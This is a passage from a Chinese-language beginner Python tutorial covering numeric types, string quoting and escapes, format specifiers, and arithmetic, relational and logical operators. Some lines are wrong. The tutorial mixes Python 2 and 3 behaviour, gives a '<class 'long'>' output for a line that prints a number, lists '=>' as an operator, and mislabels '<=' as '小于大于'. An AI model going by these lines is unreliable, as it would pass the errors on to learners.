y</td><td>除法</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>x // y</td><td>地板除</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>x % y</td><td>取余</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>x + y</td><td>加法</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>x - y</td><td>减法</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>x &lt;&lt; y</td><td>位左移</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>x &gt;&gt; y</td><td>位右移</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>x &amp; y</td><td>按位与</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>x ^ y</td><td>按位异或</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>x \</td><td>y</td><td>按位或</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>abs(x)</td><td>取绝对值</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>bin(x)</td><td>整型-&gt;二进制字符串</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>bool(x)</td><td>布尔型转换</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>chr(x)</td><td>ASCII码-&gt;单字符串</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>complex(re, im)</td><td>实部为re，虚部为im的复数</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>divmod(x, y)</td><td>除法及取余</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>float(x)</td><td>浮点转换函数</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>hex(x)</td><td>整型-&gt;十六进制字符串</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>int(x)</td><td>整型转换</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>long(x)</td><td>长整型转换</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>pow(x)</td><td>指数运算</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>oct(x)</td><td>整型-&gt;八进制字符串</td><td>√</td><td>√</td><td>√</td><td></td><td></td></tr><tr><td>round(x[, n])</td><td>保留n位小数并四舍五入</td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>unichr(x)</td><td>ASCII码-&gt;Unicode单字符串</td><td>√</td><td>√</td><td>√</td><td></td></tr></tbody></table><p><strong>要点：</strong></p><p><strong>整型 int</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">整型转换</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整数是不带有小数部分的数字，包括自然数，零，负自然数</span><br><span class="line">如： -5 100 0 88888</span><br></pre></td></tr></table></figure><p><strong>长整型 long</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">长整型转换</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">长整型 是整型的超集，可以表示无限大的整数（实际上只受限于机器的虚拟内存大小）。长整型字面值的后面带有字母“L”或“l”（推荐使用大写的“L”）</span><br></pre></td></tr></table></figure><p><strong>浮点型 float</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浮点转换函数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">浮点型数是带有小数部分的数字（小数部分也可以是0）</span><br><span class="line">小数：</span><br><span class="line">3.14 3.1 3.0 3. 0.14 .14</span><br><span class="line">如：6.18E-1 等同于 0.618　　2.9979e8 等用于 299790000.0</span><br></pre></td></tr></table></figure><p><strong>布尔型 bool</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">判断真假两种状态</span><br><span class="line">True值为1，False值为0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用来表示真假两种状态的类型</span><br><span class="line"></span><br><span class="line">True 表示真（条件满足或成立）</span><br><span class="line"></span><br><span class="line">False 表示假（条件不满足或不成立）</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">True值为1，False值为0</span><br></pre></td></tr></table></figure><p><strong>分数类型 fractions</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fractions模块</span><br><span class="line"></span><br><span class="line">fractions模块提供了分数类型的支持。</span><br><span class="line"></span><br><span class="line">Fraction类</span><br><span class="line"></span><br><span class="line">该类是fractions模块的核心，它继承了numbers.Rational类并且实现了该类所有的方法。</span><br><span class="line">用于计算最大公约数。这个函数在Python3.5之后就废弃了，官方建议使用math.gcd() 。</span><br></pre></td></tr></table></figure><p><strong>复数类型  complex</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">complex（）函数用于创建一个复数或者将一个数或字符串转换为复数形式，其返回值为一个复数。该函数的语法为：</span><br><span class="line"></span><br><span class="line">class complex(real,imag)</span><br><span class="line"></span><br><span class="line">其中，real可以为int、long、float或字符串类型；而image只能为int、long、或float类型。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">复数 与数学中的复数概念完全相同。Python中的复数有以下几个特性：</span><br><span class="line"></span><br><span class="line">复数由实数部分和虚数部分构成，表示为：real+imagj 或 real+imagJ</span><br><span class="line">复数的实部real和虚部imag都是浮点型</span><br></pre></td></tr></table></figure><p>复数的操作示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = -8.333-1.47j</span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line">(-8.333-1.47j)</span><br><span class="line">&gt;&gt;&gt; c.real # 实部</span><br><span class="line">-8.333</span><br><span class="line">&gt;&gt;&gt; c.imag # 虚部</span><br><span class="line">-1.47</span><br><span class="line">&gt;&gt;&gt; c.conjugate() # 共轭复数</span><br><span class="line">(-8.333+1.47j)</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; abs(c) # 绝对值</span><br><span class="line">8.461665852537548</span><br><span class="line">&gt;&gt;&gt; import math</span><br><span class="line">&gt;&gt;&gt; math.sqrt(c.real ** 2 + c.imag ** 2) # 等价于abs(c)</span><br><span class="line">8.461665852537548</span><br></pre></td></tr></table></figure><p><strong>下面代码返回了各种变量的类型</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#整型</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> (type(i) )</span><br><span class="line"><span class="comment">#长整型</span></span><br><span class="line">l = <span class="number">9999999999999999999</span></span><br><span class="line">print(l)</span><br><span class="line"><span class="comment">#浮点型</span></span><br><span class="line">f = <span class="number">1.2</span></span><br><span class="line">print( type(f) )</span><br><span class="line"><span class="comment">#布尔型</span></span><br><span class="line">b = <span class="literal">True</span></span><br><span class="line"><span class="keyword">print</span> (type(b))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#复数类型</span></span><br><span class="line">c = <span class="number">7</span> + <span class="number">8j</span></span><br><span class="line"><span class="keyword">print</span> (type(c))</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><strong>第3行代码输出结果：<class 'int'></class></strong></li><li><strong>第6行代码输出结果：<class 'long'></class></strong></li><li><strong>第9行代码输出结果：<class 'float'></class></strong></li><li><strong>第12行代码输出结果：<class 'bool'></class></strong></li><li><strong>复数输出结果：<class 'complex'></class></strong></li></ul><h4 id="2-4-2-字符串"><a href="#2-4-2-字符串" class="headerlink" title="2.4.2 字符串"></a>2.4.2 字符串</h4><p><strong>在Python中有3种表示字符串的方式——单引号、双引号、三引号，单引号和双引号的作用一样,三引号一般用作制作文档，将双引号也包括在哪输出</strong></p><p><strong>三引号中可以输入单引号、双引号或换行等字符</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单引号和双引号的使用是等价的</span></span><br><span class="line">str = <span class="string">"hello world!"</span></span><br><span class="line"><span class="keyword">print</span> (str)</span><br><span class="line">str = <span class="string">'hello world!'</span></span><br><span class="line"><span class="keyword">print</span> (str)</span><br></pre></td></tr></table></figure><p><strong>输出结果一样</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world!</span><br></pre></td></tr></table></figure><p><strong>三引号用法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三引号的用法</span></span><br><span class="line">str = <span class="string">'''he say "hello world!"'''</span></span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">he say &quot;hello world&quot;</span><br></pre></td></tr></table></figure><p><strong>三引号制作文档字符串</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三引号制作doc文档</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span>:</span></span><br><span class="line">    <span class="string">'''hello class'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printHello</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="string">'''print hello world'''</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"hello world!"</span>)</span><br><span class="line">print(Hello.__doc__)</span><br><span class="line">print(Hello.printHello.__doc__)</span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">print</span> <span class="title">hello</span> <span class="title">world</span></span></span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><strong>第2行代码定义了一个名问Hello的类</strong></li><li><strong>第3行是对Hello类的描述，该字符串将被存放在类的<strong> doc </strong>属性中</strong></li><li><strong>第4行代码定义了一个方法printHello（）</strong></li><li><strong>第5行代码描述了printHello()，并把字符串存放在该函数<strong> doc </strong> 属性中</strong></li></ul><h3 id="doc-属性"><a href="#doc-属性" class="headerlink" title="_ doc _属性"></a>_ doc _属性</h3><p><strong>Python的每个对象都有一个属性<strong> doc </strong>，这个属性用于描述该对象的作用</strong></p><p><strong>三引号其他例子</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">string3=<span class="string">'''</span></span><br><span class="line"><span class="string">    1.look</span></span><br><span class="line"><span class="string">    2.not</span></span><br><span class="line"><span class="string">    3.look not look</span></span><br><span class="line"><span class="string">    4.bay</span></span><br><span class="line"><span class="string">    5...</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">print(string3)</span><br><span class="line"></span><br><span class="line">string4=<span class="string">'''</span></span><br><span class="line"><span class="string">    1....</span></span><br><span class="line"><span class="string">    2....</span></span><br><span class="line"><span class="string">    3....</span></span><br><span class="line"><span class="string">    4....</span></span><br><span class="line"><span class="string">    5.1212</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">print(string4)</span><br></pre></td></tr></table></figure><p>打印结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1.l</span>ook</span><br><span class="line"><span class="number">2.</span><span class="keyword">not</span></span><br><span class="line"><span class="number">3.l</span>ook <span class="keyword">not</span> look</span><br><span class="line"><span class="number">4.</span>bay</span><br><span class="line"><span class="number">5.</span>..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>...</span><br><span class="line"><span class="number">2.</span>...</span><br><span class="line"><span class="number">3.</span>...</span><br><span class="line"><span class="number">4.</span>...</span><br><span class="line"><span class="number">5.1212</span></span><br></pre></td></tr></table></figure><h4 id="str转义字符"><a href="#str转义字符" class="headerlink" title="str转义字符"></a>str转义字符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str() 函数将对象转化为适于人阅读的形式。</span><br></pre></td></tr></table></figure><p><strong>例子</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'RUNOOB'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(s)</span><br><span class="line"><span class="string">'RUNOOB'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict = &#123;<span class="string">'runoob'</span>: <span class="string">'runoob.com'</span>, <span class="string">'google'</span>: <span class="string">'google.com'</span>&#125;;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(dict)</span><br><span class="line"><span class="string">"&#123;'google': 'google.com', 'runoob': 'runoob.com'&#125;"</span></span><br></pre></td></tr></table></figure><h3 id="关于-转义字符"><a href="#关于-转义字符" class="headerlink" title="关于 转义字符"></a>关于 转义字符</h3><p>  <strong>如果要输出含有特殊字符（单引号、双引号）的字符串，需要使用转义字符。Python中的转义字符为“\”，转移操作只要在特殊字符的前面加上“\”即可</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#转义字符</span></span><br><span class="line">str = <span class="string">'he say:\'hello world!\''</span></span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><strong>第2行代码中的单引号是特殊字符，需要在“ ’ ”前面加上转义字符</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">he say:&apos;hello world&apos;</span><br></pre></td></tr></table></figure><p><strong>使用双引号或者三引号可以直接输出含有特殊字符的字符串，不需要使用转义字符</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接输出特殊字符串</span></span><br><span class="line">str = <span class="string">"he say:'hello world!' "</span></span><br><span class="line">print(str)</span><br><span class="line">str = <span class="string">'''he say:'hello world!'''</span><span class="string">'</span></span><br><span class="line"><span class="string">print(str)</span></span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><strong>第2行代码中使用了双引号表示字符串变量str,因此Python能够识别出双引号内部的单引号作为输出字符串</strong></li><li><strong>第4行代码使用三引号表示字符串变量str,4个单引号连在一起，Python解释器不能正确识别三引号，提示错误</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: EOL <span class="keyword">while</span> scanning single-quoed string</span><br></pre></td></tr></table></figure><h4 id="原始字符串-r-R"><a href="#原始字符串-r-R" class="headerlink" title="原始字符串 r\R"></a>原始字符串 r\R</h4><p>  <strong>原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母”r”（可以大小写）以外，与普通字符串有着几乎完全相同的语法。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;print r&apos;\n&apos;</span><br><span class="line">\n</span><br><span class="line">&gt;&gt;&gt; print R&apos;\n&apos;</span><br><span class="line">\n</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string4 =<span class="string">'''</span></span><br><span class="line"><span class="string">    1.one</span></span><br><span class="line"><span class="string">    2.two</span></span><br><span class="line"><span class="string">    3.look</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">print([string4])</span><br><span class="line">print(<span class="string">r'1\n2'</span>)</span><br></pre></td></tr></table></figure><h3 id="字符表"><a href="#字符表" class="headerlink" title="字符表"></a>字符表</h3><table><thead><tr><th style="text-align:left">操作符</th><th style="text-align:left">描述</th><th style="text-align:left">实例</th></tr></thead><tbody><tr><td style="text-align:left">+</td><td style="text-align:left">字符串连接</td><td style="text-align:left">&gt;&gt;&gt;a + b ‘HelloPython’</td></tr><tr><td style="text-align:left">*</td><td style="text-align:left">重复输出字符串</td><td style="text-align:left">&gt;&gt;&gt;a * 2 ‘HelloHello’</td></tr><tr><td style="text-align:left">[]</td><td style="text-align:left">通过索引获取字符串中字符</td><td style="text-align:left">&gt;&gt;&gt;a[1] ‘e’</td></tr><tr><td style="text-align:left">[ : ]</td><td style="text-align:left">截取字符串中的一部分</td><td style="text-align:left">&gt;&gt;&gt;a[1:4] ‘ell’</td></tr><tr><td style="text-align:left">in</td><td style="text-align:left">成员运算符 - 如果字符串中包含给定的字符返回 True</td><td style="text-align:left">&gt;&gt;&gt;”H” in a True</td></tr><tr><td style="text-align:left">not in</td><td style="text-align:left">成员运算符 - 如果字符串中不包含给定的字符返回 True</td><td style="text-align:left">&gt;&gt;&gt;”M” not in a True</td></tr><tr><td style="text-align:left">r/R</td><td style="text-align:left">原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母”r”（可以大小写）以外，与普通字符串有着几乎完全相同的语法。</td><td style="text-align:left">&gt;&gt;&gt;print r’\n’ \n &gt;&gt;&gt; print R’\n’ \n</td></tr><tr><td style="text-align:left">%</td><td style="text-align:left">格式字符串</td><td style="text-align:left">请看下一章节</td></tr></tbody></table><table><thead><tr><th style="text-align:left">符   号</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">%c</td><td style="text-align:left">格式化字符及其ASCII码</td></tr><tr><td style="text-align:left">%s</td><td style="text-align:left">格式化字符串</td></tr><tr><td style="text-align:left">%d</td><td style="text-align:left">格式化整数</td></tr><tr><td style="text-align:left">%u</td><td style="text-align:left">格式化无符号整型</td></tr><tr><td style="text-align:left">%o</td><td style="text-align:left">格式化无符号八进制数</td></tr><tr><td style="text-align:left">%x</td><td style="text-align:left">格式化无符号十六进制数</td></tr><tr><td style="text-align:left">%X</td><td style="text-align:left">格式化无符号十六进制数（大写）</td></tr><tr><td style="text-align:left">%f</td><td style="text-align:left">格式化浮点数字，可指定小数点后的精度</td></tr><tr><td style="text-align:left">%e</td><td style="text-align:left">用科学计数法格式化浮点数</td></tr><tr><td style="text-align:left">%E</td><td style="text-align:left">作用同%e，用科学计数法格式化浮点数</td></tr><tr><td style="text-align:left">%g</td><td style="text-align:left">%f和%e的简写</td></tr><tr><td style="text-align:left">%G</td><td style="text-align:left">%f 和 %E 的简写</td></tr><tr><td style="text-align:left">%p</td><td style="text-align:left">用十六进制数格式化变量的地址</td></tr></tbody></table><h3 id="2-5-运算符与表达式"><a href="#2-5-运算符与表达式" class="headerlink" title="2.5 运算符与表达式"></a>2.5 运算符与表达式</h3><p>​    <strong>Python的运算符号包括运算符、关系运算符和逻辑运算符。表达式是由数字或字符串和运算符组成的式子。表达式通常用于判断语句和循环语句的条件使用，表达式是学习控制语句编写的基础</strong></p><table><thead><tr><th>算数运算符</th><th>算数表达式</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td><strong>x + y</strong></td><td><strong>加法运算</strong></td></tr><tr><td>-</td><td><strong>x - y</strong></td><td><strong>减法运算</strong></td></tr></tbody></table><table><thead><tr><th>算数运算符</th><th>算数表达式</th><th>描述</th></tr></thead><tbody><tr><td><strong>* </strong></td><td><strong>x * y</strong></td><td><strong>乘法运算</strong></td></tr><tr><td><strong>/</strong></td><td><strong>x / y</strong></td><td><strong>除法运算</strong></td></tr></tbody></table><table><thead><tr><th>算数运算符</th><th>算数表达式</th><th>描述</th></tr></thead><tbody><tr><td><strong>%</strong></td><td><strong>x % y</strong></td><td><strong>求模运算</strong></td></tr><tr><td><strong>**</strong></td><td>x <strong>**</strong> y</td><td><strong>求幂运算</strong></td></tr></tbody></table><p><strong>下面这段代码演示Python中算术运算符的使用方法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"1 + 1 ="</span>,<span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line">print(<span class="string">"2 - 1 ="</span>,<span class="number">2</span><span class="number">-1</span>)</span><br><span class="line">print(<span class="string">"2 * 3 ="</span>,<span class="number">2</span>*<span class="number">3</span>)</span><br><span class="line">print(<span class="string">"4 / 2 ="</span>,<span class="number">4</span>/<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"1 / 2 ="</span>,<span class="number">1</span>/<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"1 / 2 ="</span>,<span class="number">1.0</span>/<span class="number">2.0</span>)</span><br><span class="line">print(<span class="string">"3 % 2 ="</span>,<span class="number">3</span>%<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"2 ** 3="</span>,<span class="number">2</span>**<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="number">1</span> = <span class="number">2</span></span><br><span class="line"><span class="number">2</span> - <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">2</span> * <span class="number">3</span> = <span class="number">6</span></span><br><span class="line"><span class="number">4</span> / <span class="number">2</span> = <span class="number">2.0</span></span><br><span class="line"><span class="number">1</span> / <span class="number">2</span> = <span class="number">0.5</span></span><br><span class="line"><span class="number">1</span> / <span class="number">2</span> = <span class="number">0.5</span></span><br><span class="line"><span class="number">3</span> % <span class="number">2</span> = <span class="number">1</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">3</span>= <span class="number">8</span></span><br></pre></td></tr></table></figure><h4 id="算术运算的优先级"><a href="#算术运算的优先级" class="headerlink" title="算术运算的优先级"></a>算术运算的优先级</h4><p><strong>Python的算术表达式具有结合性和优越性。结合性是指表达式按照从左往右、先乘除后加减的原则。即从表达式的左边开始计算，先执行乘法和除法运算，在执行加法和减法运算</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#算术优先级</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = <span class="number">3</span></span><br><span class="line">d = <span class="number">4</span></span><br><span class="line">print(<span class="string">"a + b * c % d ="</span>, a + b * c % d)</span><br><span class="line">print(<span class="string">"(a+b) * (c%d) ="</span>, (a+b) * (c%d))</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a + b * c % d = <span class="number">3</span></span><br><span class="line">(a+b) * (c%d) = <span class="number">9</span></span><br></pre></td></tr></table></figure><h3 id="2-5-2-关系运算符和关系运算符"><a href="#2-5-2-关系运算符和关系运算符" class="headerlink" title="2.5.2 关系运算符和关系运算符"></a>2.5.2 关系运算符和关系运算符</h3><table><thead><tr><th>关系运算符</th><th>关系表达式</th><th>描述</th></tr></thead><tbody><tr><td><strong>&lt;</strong></td><td><strong>x &lt; y</strong></td><td><strong>小于</strong></td></tr><tr><td><strong>&gt;</strong></td><td><strong>x &gt; y</strong></td><td><strong>大于</strong></td></tr></tbody></table><table><thead><tr><th>关系运算符</th><th>关系表达式</th><th>描述</th></tr></thead><tbody><tr><td><strong>&lt;=</strong></td><td><strong>x &lt;= y</strong></td><td><strong>小于大于</strong></td></tr><tr><td><strong>=&gt;</strong></td><td><strong>x &gt;= y</strong></td><td><strong>大于等于</strong></td></tr></tbody></table><table><thead><tr><th>关系运算符</th><th>关系表达式</th><th>描述</th></tr></thead><tbody><tr><td><strong>==</strong></td><td><strong>x == y</strong></td><td><strong>等于</strong></td></tr><tr><td><strong>！=</strong></td><td><strong>x ！= y</strong></td><td><strong>不等于</strong></td></tr></tbody></table><p><strong>例子</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关系表达式</span></span><br><span class="line">print(<span class="number">2</span> &gt; <span class="number">1</span>)</span><br><span class="line">print(<span class="number">1</span> &lt;= <span class="number">2</span>)</span><br><span class="line">print(<span class="number">1</span> == <span class="number">2</span>)   <span class="comment">#逻辑错误，输出结果False</span></span><br><span class="line">print(<span class="number">1</span> != <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">True</span><br><span class="line">True</span><br><span class="line">False</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="2-5-3-逻辑运算符和逻辑运算符"><a href="#2-5-3-逻辑运算符和逻辑运算符" class="headerlink" title="2.5.3 逻辑运算符和逻辑运算符"></a>2.5.3 逻辑运算符和逻辑运算符</h3><table><thead><tr><th>逻辑运算符</th><th>逻辑表达式</th><th>描述</th></tr></thead><tbody><tr><td><strong>and</strong></td><td><strong>x and y</strong></td><td><strong>逻辑与，当x为True时，才计算y</strong></td></tr><tr><td><strong>or</strong></td><td>**x \</td><td>\</td><td>y**</td><td><strong>逻辑或，当x为False时，才计算y</strong></td></tr></tbody></table><table><thead><tr><th>逻辑运算符</th><th>逻辑表达式</th><th>描述</th></tr></thead><tbody><tr><td><strong>not</strong></td><td><strong>not x</strong></td><td><strong>逻辑非</strong></td></tr></tbody></table><p><strong>例子</strong></p><figure class="highlight python"><table><tr><td 